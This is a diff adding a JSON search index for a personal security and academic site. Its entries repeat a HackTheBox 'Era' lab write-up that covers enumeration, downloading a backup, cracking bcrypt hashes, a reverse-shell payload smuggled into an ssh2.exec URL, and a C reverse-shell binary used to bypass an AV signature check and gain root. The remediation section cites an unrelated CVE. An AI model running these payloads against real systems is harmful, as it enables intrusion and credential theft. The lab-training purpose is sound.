@@ -1,0 +1,142 @@
+[
+  {
+    "objectID": "writeups/thm/index.html",
+    "href": "writeups/thm/index.html",
+    "title": "TryHackMe Writeups",
+    "section": "",
+    "text": "Detailed solutions for TryHackMe rooms."
+  },
+  {
+    "objectID": "writeups/htb/index.html",
+    "href": "writeups/htb/index.html",
+    "title": "HackTheBox Writeups",
+    "section": "",
+    "text": "Detailed solutions for HackTheBox machines."
+  },
+  {
+    "objectID": "writeups/general/index.html",
+    "href": "writeups/general/index.html",
+    "title": "General Writeups",
+    "section": "",
+    "text": "General security topics, CVE analysis, and miscellaneous writeups."
+  },
+  {
+    "objectID": "academic/data-science/index.html",
+    "href": "academic/data-science/index.html",
+    "title": "Data Science",
+    "section": "",
+    "text": "Analyses and projects in the field of data science.\n\n\n\nData Analysis\nData Visualization\nStatistical Modeling\nBig Data\nData Mining"
+  },
+  {
+    "objectID": "academic/data-science/index.html#topics",
+    "href": "academic/data-science/index.html#topics",
+    "title": "Data Science",
+    "section": "",
+    "text": "Data Analysis\nData Visualization\nStatistical Modeling\nBig Data\nData Mining"
+  },
+  {
+    "objectID": "academic/cryptology/index.html",
+    "href": "academic/cryptology/index.html",
+    "title": "Cryptology",
+    "section": "",
+    "text": "Articles, notes, and projects in the field of cryptology.\n\n\n\nEncryption Algorithms\nCryptographic Protocols\nHash Functions\nDigital Signatures\nBlockchain Technology"
+  },
+  {
+    "objectID": "academic/cryptology/index.html#topics",
+    "href": "academic/cryptology/index.html#topics",
+    "title": "Cryptology",
+    "section": "",
+    "text": "Encryption Algorithms\nCryptographic Protocols\nHash Functions\nDigital Signatures\nBlockchain Technology"
+  },
+  {
+    "objectID": "about.html",
+    "href": "about.html",
+    "title": "About",
+    "section": "",
+    "text": "About this site"
+  },
+  {
+    "objectID": "academic/artificial-intelligence/index.html",
+    "href": "academic/artificial-intelligence/index.html",
+    "title": "Artificial Intelligence",
+    "section": "",
+    "text": "Projects in the field of artificial intelligence and machine learning.\n\n\n\nMachine Learning\nDeep Learning\nNatural Language Processing\nComputer Vision\nReinforcement Learning"
+  },
+  {
+    "objectID": "academic/artificial-intelligence/index.html#topics",
+    "href": "academic/artificial-intelligence/index.html#topics",
+    "title": "Artificial Intelligence",
+    "section": "",
+    "text": "Machine Learning\nDeep Learning\nNatural Language Processing\nComputer Vision\nReinforcement Learning"
+  },
+  {
+    "objectID": "academic/cyber-security/index.html",
+    "href": "academic/cyber-security/index.html",
+    "title": "Cyber Security",
+    "section": "",
+    "text": "Research and projects in the field of cyber security.\n\n\n\nNetwork Security\nPenetration Testing\nVulnerability Analysis\nIncident Response\nSecurity Auditing"
+  },
+  {
+    "objectID": "academic/cyber-security/index.html#topics",
+    "href": "academic/cyber-security/index.html#topics",
+    "title": "Cyber Security",
+    "section": "",
+    "text": "Network Security\nPenetration Testing\nVulnerability Analysis\nIncident Response\nSecurity Auditing"
+  },
+  {
+    "objectID": "academic/index.html",
+    "href": "academic/index.html",
+    "title": "Academic Studies",
+    "section": "",
+    "text": "OverviewCryptologyCyber SecurityArtificial IntelligenceData Science\n\n\nThis section contains my academic works and research areas. My research focuses on modern computer science topics including cryptology, cyber security, artificial intelligence, and data science.\n\nCurrent Research Interests\n\nAdvanced encryption techniques and cryptographic protocols\nNetwork security and penetration testing methodologies\nMachine learning applications in security\nBig data analysis and visualization\n\n\n\nPublications & Projects\nYou can explore my work in different areas using the tabs above.\n\n\n\n\nResearch Focus\nCryptology is the foundation of modern secure communications. My work in this area includes:\n\nEncryption Algorithms: Study and implementation of symmetric and asymmetric encryption\nCryptographic Protocols: Analysis of secure communication protocols\nHash Functions: Research on collision-resistant hash functions\nDigital Signatures: Implementation of digital signature schemes\nBlockchain Technology: Applications of cryptography in distributed systems\n\nView all Cryptology projects →\n\n\n\n\nResearch Focus\nCyber security is critical in today’s interconnected world. My research includes:\n\nNetwork Security: Firewall configuration, intrusion detection systems\nPenetration Testing: Security assessment methodologies and tools\nVulnerability Analysis: Finding and analyzing security weaknesses\nIncident Response: Handling and recovery from security incidents\nSecurity Auditing: Comprehensive security evaluation frameworks\n\nView all Cyber Security projects →\n\n\n\n\nResearch Focus\nAI and machine learning are transforming technology. My work focuses on:\n\nMachine Learning: Supervised and unsupervised learning algorithms\nDeep Learning: Neural networks and advanced architectures\nNatural Language Processing: Text analysis and language models\nComputer Vision: Image recognition and processing\nReinforcement Learning: Decision-making and optimization\n\nView all AI projects →\n\n\n\n\nResearch Focus\nData science combines statistics, programming, and domain expertise. My research includes:\n\nData Analysis: Statistical analysis and hypothesis testing\nData Visualization: Creating meaningful visual representations\nStatistical Modeling: Predictive and descriptive models\nBig Data: Handling and processing large-scale datasets\nData Mining: Discovering patterns in complex data\n\nView all Data Science projects →"
+  },
+  {
+    "objectID": "writeups/htb/era/index.html",
+    "href": "writeups/htb/era/index.html",
+    "title": "HTB: Era Machine Writeup",
+    "section": "",
+    "text": "Era machine on the HackTheBox platform.\n\n\n\nThis section details the reconnaissance activities performed on the target system.\n\n\ncurl -v http://10.10.11.79\nTrying 10.10.11.79:80...\n&lt; Location: http :// era.htb/\n\n\n\nnmap -A -sC -sV era.htb -oN nmap.txt -vvv\nNot shown: 998 closed tcp ports (reset)\n4 PORT STATE SERVICE REASON VERSION\n5 21/tcp open ftp syn -ack ttl 63 vsftpd 3.0.5\n6 80/tcp open http syn -ack ttl 63 nginx 1.18.0 (Ubuntu)\n7 | http -methods:\n8 |_ Supported Methods: GET HEAD\n9 |_http -title: Era Designs\n10 |_http -favicon: Unknown favicon MD5: 0309\nB7B14DF62A797B431119ADB37B14\n11 Device type: general purpose\n12 Running: Linux 5.X\n13 OS CPE: cpe:/o:linux:linux_kernel :5\n14 OS details: Linux 5.0 - 5.14\n15 TCP/IP fingerprint:\nSonuçlar:\n\nPort 21/tcp: vsftpd 3.0.5\nPort 80/tcp: nginx 1.18.0 (Ubuntu)\nOS: Linux 5.0 - 5.14\n\n\n\n\nfuff -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000. txt -u http :// era.htb/ -H \"Host: FUZZ.era.htb\" -mc 200\n***\nfile [Status: 200, Size: 6765, Words: 2608,Lines: 234, Duration: 61ms]\n ***\n\nresult subdomain: file.era.htb\n\n\n\nffuf -u 'http://file.era.htb/download.php?id=FUZZ' -w &lt;(seq 0 10000) -H 'Cookie: PHPSESSID=vofmm****2vc' -mc 200 -fs 7686\n***\n54                      [Status: 200, Size: 6378, Words: 2552, Lines: 222, Duration: 79ms]\n150                     [Status: 200, Size: 6366, Words: 2552, Lines: 222, Duration: 57ms]\n4151                    [Status: 200, Size: 6370, Words: 2552, Lines: 222, Duration: 54ms]\n***\nResult IDs: 54, 150, 4151 ffuf fs size results 7686 bytes because 7686 equals many 200 OK response many files. limited to 7686 bytes results for further analysis.\n\n\n\n\nHost resolved to IP: 10.10.11.79\nOpen ports: 21 (FTP), 80 (HTTP)\nServices: nginx 1.18.0 (Ubuntu), vsftpd 3.0.5\nOperating System: Linux 5.0 - 5.14\nDirectories for era.htb: /images, /css, /js, /register\nSubdomain found: file.era.htb\nDirectories for file.era.htb: /register, /login\n\n\n\n\n\n\npreparation of the exploit.\n\n\nwe found 54 and 150 and 4151 files with 200 OK response from ffuf results. After analyzing the files, we identified a Local File Inclusion (LFI) vulnerability in the web application hosted on era.htb. The vulnerability allows an attacker to read sensitive files from the server. 150 id file content: signing.zip\n\n\n\ncurl -L http://file.era.htb/download.php?id=150 -H \"Cookie: PHPSESSID=vofmm****2vc\" | grep signin\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  6366    0  6366    0     0  25469      0 --:--:-- --:--:-- --:--:-- 25566\n        &lt;p&gt;signing.zip&lt;/p&gt;\n\ncurl -X GET \"http://file.era.htb/download.php?id=150&dl=true\" -H \"Cookie: PHPSESSID=vofmm****2vc\" --output signin.zip\n***\n    unzip signin.zip\n    inflating: key.pem                 \n  inflating: x509.genkey \n***\ncurl -X GET \"http://file.era.htb/download.php?id=54&dl=true\" -H \"Cookie: PHPSESSID=vofmmgcsqftm6t8cftodhn52vc\" --output sitebackup.zip\n\n\n\nunzip sitebackup.zip \n   ***\n   filedb.sqlite\n   ***\n   sqlite3 filedb.sqlite \"SELECT user_name || ':' || user_password FROM users;\" &gt; hashes.txt\n    cat hashes.txt\n    admin_ef01cab31aa:$2y$10$wDbohsUaez********1If6WrYr.QPC\n    eric:$2y$10$S9EOSDqF1RzNUvyV***********.D.ABQLhSV2Qvxm\n    veronica:$2y$10$xQmS7JL8UT4B3jAY***************GCxLveQ805kuQGOK\n    yuri:$2b$12$HkRKUdjjOdf2WuTXovkH*************jRqUWqwEL2.\n    john:$2a$10$iccCEz6.5.W2p7CSBOr3*************a1T1V/IddE6\n    ethan:$2a$10$PkV/LAd07ftxVzBHhr****************puUV/dh/a1wC\n    ***\n    hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt.gz -w 3 -O --username\n    ***\n    $2y$10$S9EOSDqF1RzNUvyVj7Ot*************.ABQLhSV2Qvxm:ame****\n    $2b$12$HkRKUdjjOdf2WuTXovkHIOX************uWejRqUWqwEL2.:mu*****\n    ***\ncracked this hash for users:\n\neric:ame****\nyuri:mu*****\n\n\n\n\n\n\n\n\n# Reverse shell payload\nhttp://file.era.htb/download.php?id=150&show=true&format=ssh2.exec://eric:america@127.0.0.1/bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.50%2F9001%200%3E%261;true%27\n# Listener\nnc -lvnp 9001\n✅ The shell is in my hand\n\n\n\n\n\nThis section outlines the steps taken to escalate privileges on the target system. ### AV bypass and reverse shell root\nCustom binary :\n#include &lt;stdio.h&gt;\nint main() {\n    system(\"/bin/bash -c 'bash -i &gt;& /dev/tcp/TUN0IP/4242 0&gt;&1'\"); \n    return 0;\n}\ngcc exploit.c -o monitor2\npython3 -m http.server 8000\n\n\nwget -L http://TUN0IP:8000/monitor2\n    ric@era:/tmp$ objcopy --dump-section .text_sig=sig /opt/AV/periodic-checks/monitor\n    &lt;ction .text_sig=sig /opt/AV/periodic-checks/monitor\n    eric@era:/tmp$ ls -la sig\n    ls -la sig\n    -rw-rw-r-- 1 eric eric 458 Oct 18 21:10 sig\n    eric@era:/tmp$ objcopy --add-section .text_sig=sig /opt/AV/periodic-checks/monitor2\n    &lt;tion .text_sig=sig /opt/AV/periodic-checks/monitor2\n    eric@era:/tmp$ cd /opt/AV^[OM\n    cd /opt/AV\n    eric@era:/opt/AV$ cd peri\n    cd periodic-checks/\n    eric@era:/opt/AV/periodic-checks$ cp monitor2 monitor\n    cp monitor2 monitor\n    eric@era:/opt/AV/periodic-checks$ \n\n\n\nnc -lvnp 4242\n nc -lvnp 4242\n    listening on [any] 4242 ...\n\n    connect to [TUN0IP] from (UNKNOWN) [ERA.HTB] 49138\n    bash: cannot set terminal process group (4658): Inappropriate ioctl for device\n    bash: no job control in this shell\n    root@era:~# \n    root@era:~# ls\n    ls\n    answers.sh\n    clean_monitor.sh\n    initiate_monitoring.sh\n    monitor\n    root.txt\n    root@era:~# cat root.txt\n    cat root.txt\n    205***************d3e12f17b7b950\n    root@era:~# \n🎉 Root elde edildi!\n\n\n\n\n\n\n\n\nCVE-2021-41773:\n\n\nUpdate Apache to version 2.4.53 or later.\nImplement proper access controls in the Apache configuration.\n\n\nWeak Passwords:\n\nStrong password policy\nMFA (Multi-Factor Authentication)\nPassword complexity requirements\n\nAV Bypass:\n\nBinary imzalama mekanizması güçlendirme\nDosya bütünlük kontrolü\nSudoers konfigürasyonu gözden geçirme\n\nSUID Vulnerability\n\n\nRemove unnecessary SUID permissions\n\nchmod -s /usr/bin/suid_binary"
+  },
+  {
+    "objectID": "writeups/htb/era/index.html#reconnaissance",
+    "href": "writeups/htb/era/index.html#reconnaissance",
+    "title": "HTB: Era Machine Writeup",
+    "section": "",
+    "text": "This section details the reconnaissance activities performed on the target system.\n\n\ncurl -v http://10.10.11.79\nTrying 10.10.11.79:80...\n&lt; Location: http :// era.htb/\n\n\n\nnmap -A -sC -sV era.htb -oN nmap.txt -vvv\nNot shown: 998 closed tcp ports (reset)\n4 PORT STATE SERVICE REASON VERSION\n5 21/tcp open ftp syn -ack ttl 63 vsftpd 3.0.5\n6 80/tcp open http syn -ack ttl 63 nginx 1.18.0 (Ubuntu)\n7 | http -methods:\n8 |_ Supported Methods: GET HEAD\n9 |_http -title: Era Designs\n10 |_http -favicon: Unknown favicon MD5: 0309\nB7B14DF62A797B431119ADB37B14\n11 Device type: general purpose\n12 Running: Linux 5.X\n13 OS CPE: cpe:/o:linux:linux_kernel :5\n14 OS details: Linux 5.0 - 5.14\n15 TCP/IP fingerprint:\nSonuçlar:\n\nPort 21/tcp: vsftpd 3.0.5\nPort 80/tcp: nginx 1.18.0 (Ubuntu)\nOS: Linux 5.0 - 5.14\n\n\n\n\nfuff -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000. txt -u http :// era.htb/ -H \"Host: FUZZ.era.htb\" -mc 200\n***\nfile [Status: 200, Size: 6765, Words: 2608,Lines: 234, Duration: 61ms]\n ***\n\nresult subdomain: file.era.htb\n\n\n\nffuf -u 'http://file.era.htb/download.php?id=FUZZ' -w &lt;(seq 0 10000) -H 'Cookie: PHPSESSID=vofmm****2vc' -mc 200 -fs 7686\n***\n54                      [Status: 200, Size: 6378, Words: 2552, Lines: 222, Duration: 79ms]\n150                     [Status: 200, Size: 6366, Words: 2552, Lines: 222, Duration: 57ms]\n4151                    [Status: 200, Size: 6370, Words: 2552, Lines: 222, Duration: 54ms]\n***\nResult IDs: 54, 150, 4151 ffuf fs size results 7686 bytes because 7686 equals many 200 OK response many files. limited to 7686 bytes results for further analysis.\n\n\n\n\nHost resolved to IP: 10.10.11.79\nOpen ports: 21 (FTP), 80 (HTTP)\nServices: nginx 1.18.0 (Ubuntu), vsftpd 3.0.5\nOperating System: Linux 5.0 - 5.14\nDirectories for era.htb: /images, /css, /js, /register\nSubdomain found: file.era.htb\nDirectories for file.era.htb: /register, /login"
+  },
+  {
+    "objectID": "writeups/htb/era/index.html#weaponization",
+    "href": "writeups/htb/era/index.html#weaponization",
+    "title": "HTB: Era Machine Writeup",
+    "section": "",
+    "text": "preparation of the exploit.\n\n\nwe found 54 and 150 and 4151 files with 200 OK response from ffuf results. After analyzing the files, we identified a Local File Inclusion (LFI) vulnerability in the web application hosted on era.htb. The vulnerability allows an attacker to read sensitive files from the server. 150 id file content: signing.zip\n\n\n\ncurl -L http://file.era.htb/download.php?id=150 -H \"Cookie: PHPSESSID=vofmm****2vc\" | grep signin\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  6366    0  6366    0     0  25469      0 --:--:-- --:--:-- --:--:-- 25566\n        &lt;p&gt;signing.zip&lt;/p&gt;\n\ncurl -X GET \"http://file.era.htb/download.php?id=150&dl=true\" -H \"Cookie: PHPSESSID=vofmm****2vc\" --output signin.zip\n***\n    unzip signin.zip\n    inflating: key.pem                 \n  inflating: x509.genkey \n***\ncurl -X GET \"http://file.era.htb/download.php?id=54&dl=true\" -H \"Cookie: PHPSESSID=vofmmgcsqftm6t8cftodhn52vc\" --output sitebackup.zip\n\n\n\nunzip sitebackup.zip \n   ***\n   filedb.sqlite\n   ***\n   sqlite3 filedb.sqlite \"SELECT user_name || ':' || user_password FROM users;\" &gt; hashes.txt\n    cat hashes.txt\n    admin_ef01cab31aa:$2y$10$wDbohsUaez********1If6WrYr.QPC\n    eric:$2y$10$S9EOSDqF1RzNUvyV***********.D.ABQLhSV2Qvxm\n    veronica:$2y$10$xQmS7JL8UT4B3jAY***************GCxLveQ805kuQGOK\n    yuri:$2b$12$HkRKUdjjOdf2WuTXovkH*************jRqUWqwEL2.\n    john:$2a$10$iccCEz6.5.W2p7CSBOr3*************a1T1V/IddE6\n    ethan:$2a$10$PkV/LAd07ftxVzBHhr****************puUV/dh/a1wC\n    ***\n    hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt.gz -w 3 -O --username\n    ***\n    $2y$10$S9EOSDqF1RzNUvyVj7Ot*************.ABQLhSV2Qvxm:ame****\n    $2b$12$HkRKUdjjOdf2WuTXovkHIOX************uWejRqUWqwEL2.:mu*****\n    ***\ncracked this hash for users:\n\neric:ame****\nyuri:mu*****"
+  },
+  {
+    "objectID": "writeups/htb/era/index.html#exploitation",
+    "href": "writeups/htb/era/index.html#exploitation",
+    "title": "HTB: Era Machine Writeup",
+    "section": "",
+    "text": "# Reverse shell payload\nhttp://file.era.htb/download.php?id=150&show=true&format=ssh2.exec://eric:america@127.0.0.1/bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.50%2F9001%200%3E%261;true%27\n# Listener\nnc -lvnp 9001\n✅ The shell is in my hand"
+  },
+  {
+    "objectID": "writeups/htb/era/index.html#privilege-escalation",
+    "href": "writeups/htb/era/index.html#privilege-escalation",
+    "title": "HTB: Era Machine Writeup",
+    "section": "",
+    "text": "This section outlines the steps taken to escalate privileges on the target system. ### AV bypass and reverse shell root\nCustom binary :\n#include &lt;stdio.h&gt;\nint main() {\n    system(\"/bin/bash -c 'bash -i &gt;& /dev/tcp/TUN0IP/4242 0&gt;&1'\"); \n    return 0;\n}\ngcc exploit.c -o monitor2\npython3 -m http.server 8000\n\n\nwget -L http://TUN0IP:8000/monitor2\n    ric@era:/tmp$ objcopy --dump-section .text_sig=sig /opt/AV/periodic-checks/monitor\n    &lt;ction .text_sig=sig /opt/AV/periodic-checks/monitor\n    eric@era:/tmp$ ls -la sig\n    ls -la sig\n    -rw-rw-r-- 1 eric eric 458 Oct 18 21:10 sig\n    eric@era:/tmp$ objcopy --add-section .text_sig=sig /opt/AV/periodic-checks/monitor2\n    &lt;tion .text_sig=sig /opt/AV/periodic-checks/monitor2\n    eric@era:/tmp$ cd /opt/AV^[OM\n    cd /opt/AV\n    eric@era:/opt/AV$ cd peri\n    cd periodic-checks/\n    eric@era:/opt/AV/periodic-checks$ cp monitor2 monitor\n    cp monitor2 monitor\n    eric@era:/opt/AV/periodic-checks$ \n\n\n\nnc -lvnp 4242\n nc -lvnp 4242\n    listening on [any] 4242 ...\n\n    connect to [TUN0IP] from (UNKNOWN) [ERA.HTB] 49138\n    bash: cannot set terminal process group (4658): Inappropriate ioctl for device\n    bash: no job control in this shell\n    root@era:~# \n    root@era:~# ls\n    ls\n    answers.sh\n    clean_monitor.sh\n    initiate_monitoring.sh\n    monitor\n    root.txt\n    root@era:~# cat root.txt\n    cat root.txt\n    205***************d3e12f17b7b950\n    root@era:~# \n🎉 Root elde edildi!"
+  },
+  {
+    "objectID": "writeups/htb/era/index.html#remediation",
+    "href": "writeups/htb/era/index.html#remediation",
+    "title": "HTB: Era Machine Writeup",
+    "section": "",
+    "text": "CVE-2021-41773:\n\n\nUpdate Apache to version 2.4.53 or later.\nImplement proper access controls in the Apache configuration.\n\n\nWeak Passwords:\n\nStrong password policy\nMFA (Multi-Factor Authentication)\nPassword complexity requirements\n\nAV Bypass:\n\nBinary imzalama mekanizması güçlendirme\nDosya bütünlük kontrolü\nSudoers konfigürasyonu gözden geçirme\n\nSUID Vulnerability\n\n\nRemove unnecessary SUID permissions\n\nchmod -s /usr/bin/suid_binary"
+  },
+  {
+    "objectID": "writeups/index.html",
+    "href": "writeups/index.html",
+    "title": "CTF Writeups",
+    "section": "",
+    "text": "Detailed writeups from various CTF platforms.\n\n\n\nEnterprise-grade penetration testing labs and machines\nView all HTB writeups →\n\n\n\nGuided learning paths and interactive rooms\nView all THM writeups →\n\n\n\nCVE analysis and security research topics\nView all general writeups →"
+  }
+]
